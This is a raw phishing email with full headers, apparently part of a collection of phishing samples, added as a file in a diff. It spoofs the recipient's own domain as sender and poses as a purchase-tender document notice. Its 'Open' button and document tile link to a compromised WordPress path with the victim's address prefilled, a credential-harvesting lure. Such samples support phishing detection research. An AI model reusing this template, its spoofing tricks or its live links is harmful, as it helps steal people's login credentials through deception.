@@ -1,0 +1,106 @@
+Return-Path: pulsalpha@sv14711.xserver.jp
+Delivered-To: jose@monkey.org
+X-FDA: 82839753024.25.9C3E859
+Received: from sv14711.xserver.jp (sv14711.xserver.jp [162.43.104.112])
+	by imf13.b.hostedemail.com (Postfix) with ESMTP id DBAF912001D
+	for <jose@monkey.org>; Fri, 29 Nov 2024 17:03:12 +0000 (UTC)
+Authentication-Results: imf13.b.hostedemail.com;	dkim=none;	dmarc=fail
+ reason="SPF not aligned (relaxed), No valid DKIM" header.from=monkey.org
+ (policy=none);	spf=pass (imf13.b.hostedemail.com: domain of
+ pulsalpha@sv14711.xserver.jp designates 162.43.104.112 as permitted sender)
+ smtp.mailfrom=pulsalpha@sv14711.xserver.jp
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1732899792;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:list-unsubscribe; bh=IyLhxxW+OR0694klrMBWFxEtYiBm8vwxZY6w269vkuY=;
+	b=HG2y4FP6zGB/7Nysr3LItZDYxUw6etMXE8oHlbx3ZJ1CMNP8rN+Hknpoy9pLr96+7QMhpi
+	iqY08FhxcnSOzTx0owUQamEwmllPvfQT7/BJIoKgfsZIby2akejJ663r3hppkKzb98Oj4f
+	bu0LPIlC28D/HoNj/tfrkXaRpVRZzL4=
+ARC-Authentication-Results: i=1;	imf13.b.hostedemail.com;	dkim=none;
+	dmarc=fail reason="SPF not aligned (relaxed), No valid DKIM"
+ header.from=monkey.org (policy=none);	spf=pass (imf13.b.hostedemail.com:
+ domain of pulsalpha@sv14711.xserver.jp designates 162.43.104.112 as permitted
+ sender) smtp.mailfrom=pulsalpha@sv14711.xserver.jp
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1732899792; a=rsa-sha256;
+	cv=none;
+	b=rhgn1j4T6Ck68bK7NATns97VA35xyTCDTj66NWlZBq6tPKh7WMaTNPxF/Q1sRueHe0X/o5
+	N5SXM7svq2yM6SACR65Jm9hJ6+gzLBll91UxIM4Q9+PdqjkoNX9pGmDEwEmaQARGHORCQD
+	UY5qtx35/x/BOkouwuVTIN3OMUZxmCE=
+X-Virus-Status: clean(F-Secure/fsigk_smtp/550/virusgw14004.xserver.jp)
+Received: by sv14711.xserver.jp (Postfix, from userid 20130)
+	id 3316A10099AB9EA; Sat, 30 Nov 2024 01:44:46 +0900 (JST)
+Date: Fri, 29 Nov 2024 16:44:46 +0000
+To: jose@monkey.org
+From: Monkey <Monkey@monkey.org>
+Subject: PURCHASE6220
+Message-ID: <6fc7f2180d046e07bc43f1bf3175d35b@plus-alphaa.com>
+X-Priority: 1
+X-Mailer: PHP/7.4.33
+List-Unsubscribe: <mailto:Monkey@monkey.org>,<https://wretailsolutions.com>
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+X-Rspam-User: 
+X-Rspamd-Server: rspam10
+X-Rspamd-Queue-Id: DBAF912001D
+X-Spam-Status: No, score=2.39
+X-Stat-Signature: dcwqbdnqn46pthazjh4hdw867cqboq4f
+X-HE-Bulk: true
+X-HE-Tag: 1732899792-147077
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1/u+0HUzTQcKSBekij0ceZRP+MTBWyUe/ooGmyPJuZW0Ft?=
+ =?utf-8?q?xxIl74x4d5gwtv+cOWSDrJeQl5wECEN80oPRbaC4pe0spFdhnOJFdQhbPpbiCN6od?=
+ =?utf-8?q?UbBPuXymj/s49nluvKpCGlQs69Lek8GgTVkmppLglVKLzKobeDyrprOnsZUQBYdcO?=
+ =?utf-8?q?ZXELVtHHhfdFD0CW9e9fmG9YL5NngVgzmTseDG0Yn00xpgGYtuue0HkQQIhmbsRsk?=
+ =?utf-8?q?g45kyAqaW6FayL/Od+wVUtg7nU+vfDNlnRs9cCm1rBAYPpbBbCdKKrrhBmuft6vQx?=
+ =?utf-8?q?hpIgzMy9s7xneYZOM9HXN+nUmfs7NpXsW7gHj6JFsklXE5D+rsTHZH5ACwiOY1rZY?=
+ =?utf-8?q?4oaLspQlW1f3xEqQJKa+apbBXsJpSnpW/nLsyVwPRmal8bedkXgMJxqdYgSNarGV0?=
+ =?utf-8?q?j6nOyLPDkPJ3GrtGq1qAWyoCTAvIcqSkKSXtjoD5dfNFx4Zo98R1DN1plRcSLXm9q?=
+ =?utf-8?q?ZmFzw9/RY189jkEh1nfl8cp2R8ZiGWbwpOiJhPgkSD0iQw/uh0rWfyqYC1NR9ELr0?=
+ =?utf-8?q?OpFfCdnbq29Y69Pbus7btiSLDiHbR98ZZTCyIr7o+2kHAFpdtmNCxKp67DDUzARMy?=
+ =?utf-8?q?z659aGEJl732jPr7BPjB6aWHmo5hmEag+vum8LpKHBMJPLX3S9ewA/JJ++gEbLqjO?=
+ =?utf-8?q?AJ6Z4OFBFoP4EDGJVuJ++t5yy95CfNXdQiZeDaQeLXULneUi0Q/UEtFKcGBQK0srM?=
+ =?utf-8?q?33Uz8+jfisZQSy2lNylfJhSS1ciH8BzDvfI6l39bIGXpuDvOXix3EVvLEgSO4dWUJ?=
+ =?utf-8?q?qppeifGuILMewh4vAcifekGZbs3QxjUiJwUgxpcxZwG/NBnCfl+KsFw19uEZkFeHT?=
+ =?utf-8?q?1KI4ZqtwNiDKg2jrpjmzsGEg+85Kvkto84ZlFkGYiWDJuag9huQmabhbTrHsPPuOO?=
+ =?utf-8?q?aSFQA44YGVKvNlfmc5Nz73_0Q/pIr6gOcAVEl1WweurljxEZZBDMwQh/3ecV2Effd?=
+ =?utf-8?q?YM9o0G1hMbVAA0TJt+bMD/VyGIeXv4Zdw/e5NOeGXqnKeNIgMzRd2Xb+laES809Ac?=
+ =?utf-8?q?mFths80rsnvXuYzClgYbxVTjHgBsaMVkmBuw2XusqeOAgCjBmUj1FdU8eNByVLSHx?=
+ =?utf-8?q?XRZr+VtJElJfUgU1uRbKlBqnbHupvJd06FhqPg5dprdubcoBHP8qqg16s0PXnYdhv?=
+ =?utf-8?q?xW6/zGe6JXtVkUY6Q9teYEQaBNaStpIRp63CfuZWg4kSjuhfFgIl+L3GJTtLhRvAa?=
+ =?utf-8?q?aTUxmNX2+LK/qQS7Y10B9LjoU4EXxHg9vlHxsDr4KJROtV2l0Cy7ZTX57YjDtYtcP?=
+ =?utf-8?q?ewIfEfwxOjSouqs99LLhf5qrbplCUMN4V3dAmHMsk3Z4EpP4n8ApVS0EfwAdy83ce?=
+ =?utf-8?q?FaqR/8RB+4m/HJy5m/XH+zA6JZWDQ83GzjJ0oX5GWCimW7waw3wwpf6iZcvIxKn8X?=
+ =?utf-8?q?qhAAka4/IiXdXt7MdFYCKe9zW6M+zAT/OxjOMOtIdi9I/YWU+h9YIPVsnGmxF7wNl?=
+ =?utf-8?q?+1zkF84Eu8DZXN4U3Y6cJRKLvpdvF+y244SCMWEkEancCmJfjABbe0UZ/YqycvK8H?=
+ =?utf-8?q?4ZcC/1avvpZF0Xh4lJu+KCjdxXvYelsFZMjiRFu9gjgR1e28YgG1ClZump7X1OWcM?=
+ =?utf-8?q?72x9dpppJWL+QmAbAVHKkUp06VI9chQzRbA+dCytKLhpFkHKE8e3rhGCnYd9nPXdV?=
+ =?utf-8?q?nfseLHD1KvrMhqSi2YA5k7Iyy3mqtPdwApseqr+Ktc4G89BYhdO25a0a1UfZvD5Pu?=
+ =?utf-8?q?FLpWYZ89xOW6JCC?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 368
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+</head>
+<body style="margin: 0.4em;">
+<table style='margin: 0px auto; border: 1px solid rgb(200, 200, 200); border-image: none; width: 640px; color: rgb(33, 33, 33); text-transform: none; text-indent: 0px; letter-spacing: normal; overflow: hidden; font-family: "Segoe UI","Segoe WP","Segoe UI WPC",Tahoma,Arial,sans-serif; font-size: 15px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; max-width: 640px; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);' border="0" cellspacing="0"
+cellpadding="0"><tbody><tr>
+<td align="center" style="padding-top: 36px; padding-right: 36px; padding-left: 36px;" colspan="3"><br></td></tr><tr><td valign="top" style="padding: 16px; height: 18px; vertical-align: top;" colspan="2"><img width="250" height="80" style="display: block;" src="http://cdn.mcauto-images-production.sendgrid.net/9e1569890bc4f99b/b0ee7cb7-427b-48ed-9939-947b10b64020/2058x654.png"></td></tr><tr>
+<td style="padding: 40px 20px 28px; text-align: center; border-top-color: rgb(222, 222, 222); border-top-width: 1px; border-top-style: solid; background-color: rgb(248, 248, 248);" colspan="3"> <p style="margin: 0px; color: rgb(50, 49, 48); font-size: 16px;"> Ref. Tender No. Um-001/PURCHASE6220/2024-S0 </p></td></tr><tr><td align="center" style="background-color: rgb(248, 248, 248);" colspan="3">
+<a style="color: rgb(50, 49, 48); text-decoration: none;" href="https://web.kazutaka72.com/wp-includes/ssl/cube/?email=jose@monkey.org" rel="noreferrer"><table align="center" style="background: 0% 50% rgb(255, 255, 255); width: 388px; text-align: center; -moz-background-clip: -moz-initial; -moz-background-origin: -moz-initial; -moz-background-inline-policy: -moz-initial;" border="0" cellspacing="0" cellpadding="0"> <tbody><tr>
+<td style="background: 0% 50% rgb(255, 255, 255); padding: 20px 4px 20px 20px; border-top-color: rgb(210, 210, 210); border-bottom-color: rgb(210, 210, 210); border-left-color: rgb(210, 210, 210); border-top-width: 1px; border-bottom-width: 1px; border-left-width: 1px; border-top-style: solid; border-bottom-style: solid; border-left-style: solid; -moz-background-clip: -moz-initial; -moz-background-origin: -moz-initial; -moz-background-inline-policy: -moz-initial;">
+<img width="32" style="width: 32px; display: block;" src="http://cdn.mcauto-images-production.sendgrid.net/803a3b8933626ea6/7d2e0863-840b-4b0e-ad8d-01d42b261f6e/96x96.png"></td>
+<td style="padding: 20px 20px 20px 4px; text-align: left; font-size: 16px; border-top-color: rgb(210, 210, 210); border-right-color: rgb(210, 210, 210); border-bottom-color: rgb(210, 210, 210); border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-top-style: solid; border-right-style: solid; border-bottom-style: solid; background-color: rgb(255, 255, 255);">Um-001/PURCHASE6220/2024-S0.doc<br></td></tr></tbody></table></a></td></tr><tr>
+<td align="center" style="text-align: center; background-color: rgb(248, 248, 248);" colspan="3"> <div><table align="center" style="width: auto; height: 20px;" border="0" cellspacing="0" cellpadding="0"> <tbody><tr><td align="center" style="padding: 24px 4px 20px 0px; height: 20px;"><img width="20" height="20" style="display: inline;" src="http://cdn.mcauto-images-production.sendgrid.net/803a3b8933626ea6/567957c9-215b-4b9e-b0da-0849f98c825c/48x48.png"></td>
+    <td style="padding: 20px 0px; color: rgb(50, 49, 48); font-size: 12px;">monkey.org Server.</td></tr></tbody></table></div></td></tr><tr><td style="padding: 0px 0px 32px; height: 40px; text-align: center; border-top-color: currentColor; border-bottom-color: currentColor; border-top-width: medium; border-bottom-width: medium; border-top-style: none; border-bottom-style: none; background-color: rgb(248, 248, 248);" colspan="3">
+        <a style="border-style: solid; border-color: rgb(0, 120, 212); width: 168px; text-align: center; color: rgb(255, 255, 255); line-height: 40px; font-size: 16px; text-decoration: none; background-color: rgb(0, 120, 212);" href="https://web.kazutaka72.com/wp-includes/ssl/cube?-=jose@monkey.org" target="_blank" rel="noreferrer">Open</a></td></tr></tbody></table>
+<table style='margin: 0px auto; width: 640px; color: rgb(33, 33, 33); text-transform: none; text-indent: 0px; letter-spacing: normal; overflow: hidden; font-family: "Segoe UI","Segoe WP","Segoe UI WPC",Tahoma,Arial,sans-serif; font-size: 15px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; max-width: 640px; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);' border="0" cellspacing="0" cellpadding="0"> <colgroup> <col width="64" style="width: 0px;">
+ <col width="256" style="width: 0px;"> <col width="135" style="width: 0px;"> <col width="175" style="width: 0px;"></colgroup> <tbody><tr><td valign="top" style="padding: 16px; height: 18px; vertical-align: top;" colspan="2"><img width="84" height="18" style="display: block;" src="http://cdn.mcauto-images-production.sendgrid.net/803a3b8933626ea6/0d8ee900-8b1d-4775-b671-594d1ecc8ff7/172x40.png"></td></tr></tbody>
+
